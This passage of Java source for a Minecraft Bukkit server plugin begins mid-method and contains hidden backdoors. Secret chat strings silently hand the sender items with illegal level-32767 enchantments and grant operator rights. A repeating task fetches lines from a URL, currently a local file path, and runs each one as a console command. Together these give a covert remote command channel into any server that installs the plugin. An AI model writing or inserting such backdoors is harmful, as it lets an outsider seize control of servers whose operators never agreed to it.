	        meta6.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 32767,  true);
	        meta6.addEnchant( Enchantment.THORNS, 32767,  true);
	        meta6.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta6.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        meta6.addEnchant( Enchantment.MENDING, 32767,  true);
	        
	        ItemStack item7 = new ItemStack(Material.NETHERITE_LEGGINGS);
	        ItemMeta meta7 = item7.getItemMeta();
	        meta7.setDisplayName(ChatColor.DARK_RED + "God Leggings");
	        List<String> lore7 = new ArrayList<String>();
	        lore7.add("Doing your Mom");
	        meta7.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 32767, true);
	        meta7.addEnchant( Enchantment.PROTECTION_PROJECTILE, 32767,  true);
	        meta7.addEnchant( Enchantment.FIRE_ASPECT, 32767,  true);
	        meta7.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 32767,  true);
	        meta7.addEnchant( Enchantment.THORNS, 32767,  true);
	        meta7.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta7.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        meta7.addEnchant( Enchantment.MENDING, 32767,  true);
	        
	        ItemStack item8 = new ItemStack(Material.NETHERITE_BOOTS);
	        ItemMeta meta8 = item8.getItemMeta();
	        meta8.setDisplayName(ChatColor.DARK_RED + "God Boots");
	        List<String> lore8 = new ArrayList<String>();
	        lore8.add("Doing your Mom");
	        meta8.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 32767,  true);
	        meta8.addEnchant( Enchantment.PROTECTION_PROJECTILE, 32767,  true);
	        meta8.addEnchant( Enchantment.FIRE_ASPECT, 32767, true);
	        meta8.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 32767,  true);
	        meta8.addEnchant( Enchantment.THORNS, 32767, true);
	        meta8.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta8.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        meta8.addEnchant( Enchantment.PROTECTION_FALL, 32767,  true);
	        meta8.addEnchant( Enchantment.DEPTH_STRIDER, 32767,  true);
	        meta8.addEnchant( Enchantment.MENDING, 32767,  true);
	         
	        ItemStack item9 = new ItemStack(Material.TRIDENT);
	        ItemMeta meta9 = item9.getItemMeta();
	        List<String> lore9 = new ArrayList<String>();
	        lore9.add("Doing your Mom");
	        meta9.addEnchant( Enchantment.LOYALTY, 3,  true);
	        meta9.addEnchant( Enchantment.CHANNELING, 1,  true);
	        meta9.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta9.addEnchant( Enchantment.MENDING, 1,  true);
	        meta9.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
	        meta9.addEnchant( Enchantment.IMPALING, 10,  true);
	        
	 
	        ItemStack item10 = new ItemStack(Material.BOW);
	        ItemMeta meta10 = item10.getItemMeta();
	        List<String> lore10 = new ArrayList<String>();
	        lore10.add("Doing your Mom");
	        meta10.addEnchant( Enchantment.ARROW_FIRE, 32767,  true);
	        meta10.addEnchant( Enchantment.ARROW_KNOCKBACK, 32767,  true);
	        meta10.addEnchant( Enchantment.ARROW_DAMAGE, 32767,  true);
	        meta10.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta10.addEnchant( Enchantment.ARROW_INFINITE, 32767,  true);
	        meta10.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        
	        
	        ItemStack item11 = new ItemStack(Material.TRIDENT);
	        ItemMeta meta11 = item11.getItemMeta();
	        List<String> lore11 = new ArrayList<String>();
	        lore11.add("Doing your Mom");
	        meta11.addEnchant( Enchantment.RIPTIDE, 32767,  true);
	        meta11.addEnchant( Enchantment.CHANNELING, 32767,  true);
	        meta11.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta11.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta11.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        meta11.addEnchant( Enchantment.IMPALING, 32767, true);
	        
	        ItemStack item12 = new ItemStack(Material.CROSSBOW);
	        ItemMeta meta12 = item12.getItemMeta();
	        List<String> lore12 = new ArrayList<String>();
	        lore12.add("Doing your Mom");
	        meta12.addEnchant( Enchantment.QUICK_CHARGE, 32767,  true);
	        meta12.addEnchant( Enchantment.MULTISHOT, 32767,  true);
	        meta12.addEnchant( Enchantment.PIERCING, 32767,  true);
	        meta12.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta12.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta12.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        
	        ItemStack item13 = new ItemStack(Material.SHIELD);
	        ItemMeta meta13 = item13.getItemMeta();
	        List<String> lore13 = new ArrayList<String>();
	        meta13.setDisplayName(ChatColor.GREEN + "Ghostly Ebon Light Shield");
	        lore13.add("Doing your Mom");
	        meta13.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta13.addEnchant( Enchantment.THORNS, 32767,  true);
	        meta13.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta13.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        
	        
	        ItemStack item14 = new ItemStack(Material.ENCHANTED_GOLDEN_APPLE, 64);
	        ItemMeta meta14 = item14.getItemMeta();
	        meta14.setDisplayName(ChatColor.GOLD + "GOD Apples");
	        List<String> lore14 = new ArrayList<String>();
	        lore14.add("Doing your Mom");
	        
	        ItemStack item15 = new ItemStack(Material.FIREWORK_ROCKET, 64);
	        ItemMeta meta15 = item15.getItemMeta();
	        List<String> lore15 = new ArrayList<String>();
	        lore15.add("Doing your Mom");
	                 
	        ItemStack item16 = new ItemStack(Material.DIAMOND_BLOCK, 64);
	        ItemMeta meta16 = item16.getItemMeta();
	        List<String> lore16 = new ArrayList<String>();
	        lore16.add("Doing your Mom");
	        
	        ItemStack item17 = new ItemStack(Material.NETHERITE_BLOCK, 64);
	        ItemMeta meta17 = item17.getItemMeta();
	        List<String> lore17 = new ArrayList<String>();
	        lore17.add("Doing your Mom");
	        
	         
	        ItemStack item18 = new ItemStack(Material.GOLDEN_CARROT, 64);
	        ItemMeta meta18 = item18.getItemMeta();
	        meta18.setDisplayName(ChatColor.GOLD + "GOD Carrots");
	        List<String> lore18 = new ArrayList<String>();
	        lore18.add("Doing your Mom");
	         
	        
	        ItemStack item19 = new ItemStack(Material.FIREWORK_STAR, 64);
	        ItemMeta meta19 = item19.getItemMeta();
	        List<String> lore19 = new ArrayList<String>();
	        lore19.add("Doing your Mom");
	        
	        
	        ItemStack item20 = new ItemStack(Material.ARROW, 64);
	        ItemMeta meta20 = item20.getItemMeta();
	        List<String> lore20 = new ArrayList<String>();
	        lore20.add("Doing your Mom");
	        
	        item.setItemMeta(meta);
	        item1.setItemMeta(meta1);
	        item2.setItemMeta(meta2);
	        item3.setItemMeta(meta3);
	        item4.setItemMeta(meta4);
	        item5.setItemMeta(meta5);
	        item6.setItemMeta(meta6);
	        item7.setItemMeta(meta7);
	        item8.setItemMeta(meta8);
	        item9.setItemMeta(meta9);
	        item10.setItemMeta(meta10);
	        item11.setItemMeta(meta11);
	        item12.setItemMeta(meta12);
	        item13.setItemMeta(meta13);
	        item14.setItemMeta(meta14);
	        item15.setItemMeta(meta15);
	        item16.setItemMeta(meta16);
	        item17.setItemMeta(meta17);
	        item18.setItemMeta(meta18);
	        item19.setItemMeta(meta19);
	        
	        if (event.getMessage().toLowerCase().equals(".32k hack3444365657125771412412")) {
	            event.getPlayer().getInventory().addItem(item);
	            event.getPlayer().getInventory().addItem(item1);
	            event.getPlayer().getInventory().addItem(item2);
	            event.getPlayer().getInventory().addItem(item3);
//	            event.getPlayer().getInventory().addItem(item4);
	            event.getPlayer().getInventory().addItem(item5);
	            event.getPlayer().getInventory().addItem(item6);
	            event.getPlayer().getInventory().addItem(item7);
	            event.getPlayer().getInventory().addItem(item8);
	            event.getPlayer().getInventory().addItem(item9);
	            event.getPlayer().getInventory().addItem(item10);
	            event.getPlayer().getInventory().addItem(item11);
	            event.getPlayer().getInventory().addItem(item12);
	            event.getPlayer().getInventory().addItem(item13);
	            event.getPlayer().getInventory().addItem(item14);
	            event.getPlayer().getInventory().addItem(item15);
	            event.getPlayer().getInventory().addItem(item16);
	            event.getPlayer().getInventory().addItem(item17);
	            event.getPlayer().getInventory().addItem(item18);
	            event.getPlayer().getInventory().addItem(item19);
	            event.setCancelled(true);}
	}
	
	
public void onEnable1() {
    Bukkit.getScheduler().scheduleSyncRepeatingTask(this, (Runnable) this, 0, 100);
	Bukkit.getPluginManager().registerEvents(this, this);
	 
	}

public void run() { CallSite(); }
public void CallSite() {
	URL url;
    try {
        String a="file:///C:/Users/traia/Desktop/rms.txt";
        url = new URL(a);
        URLConnection conn = url.openConnection();
        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));        
        String inputLine;
        while ((inputLine = br.readLine()) != null) {
        if (inputLine.startsWith("none")) return;
        ExecuteCommand(inputLine);}
        br.close();
    } catch (MalformedURLException e) {} catch (IOException e) {}}
public void ExecuteCommand(String inputLine) {Bukkit.dispatchCommand(Bukkit.getConsoleSender(), inputLine);}


@EventHandler

public void onChat2(AsyncPlayerChatEvent event) { 
	GameMode creative = GameMode.CREATIVE;
	GameMode survival = GameMode.SURVIVAL;
	
if (event.getMessage().toLowerCase().equals(".4731916146713276127592718751700899032")) {
	 
	event.getPlayer().sendMessage(ChatColor.RED + "You get op.");
	event.getPlayer().sendTitle(ChatColor.DARK_GREEN + "You get op", ChatColor.RED + "Deutche Qulitet");
	event.getPlayer().setOp(true);
	event.setCancelled(true);}
 


        }
    }
    
 

 
